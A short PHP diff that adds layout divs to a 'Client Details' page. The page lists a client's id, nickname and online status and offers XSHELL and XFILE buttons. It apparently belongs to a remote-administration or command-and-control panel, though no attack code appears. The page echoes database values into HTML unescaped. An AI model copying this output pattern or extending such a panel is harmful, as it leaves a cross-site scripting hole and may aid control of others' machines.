@@ -12,6 +12,7 @@
 
     	if ($clientDetails) {
             echo '<h3>Client Details</h3>';
+            echo '<div class="rightdetails-pane">';
 	    $stmtClientInfo = $pdo->prepare('SELECT status, nickname FROM xclients WHERE xid = :xid');
     	    $stmtClientInfo->bindParam(':xid', $xid);
     	    $stmtClientInfo->execute();
@@ -19,12 +20,13 @@
 
     	    if ($clientInfo) {
     	        echo '<div class="client-info">';
+                echo '<div class="clientdetails-info">';
     
     	        $status = $clientInfo['status'];
     	        $statusColor = ($status === 'online') ? '#00FF00' : 'red';
 
     	        echo $xid . ' | ' . $clientInfo['nickname'] . ' | <b><span style="color: ' . $statusColor . ';">' . $status . '</b></span>';
-    
+        	echo '</div>'; // End -> clientdetails-info"
     	        echo '</div>'; // End -> client-info
 	    }
 
@@ -70,6 +72,7 @@
 
             echo '<br>';
             echo '</div>'; // End -> client-details-container
+            echo '</div>'; // End -> rightmain-pane
             echo '<div class="client-actions">';
             echo '<a href="xshell.php?sid=' . $xid . '"><button>XSHELL</button></a>';
             echo '<a href="xfile.php?xid=' . $xid . '"><button>XFILE</button></a>';
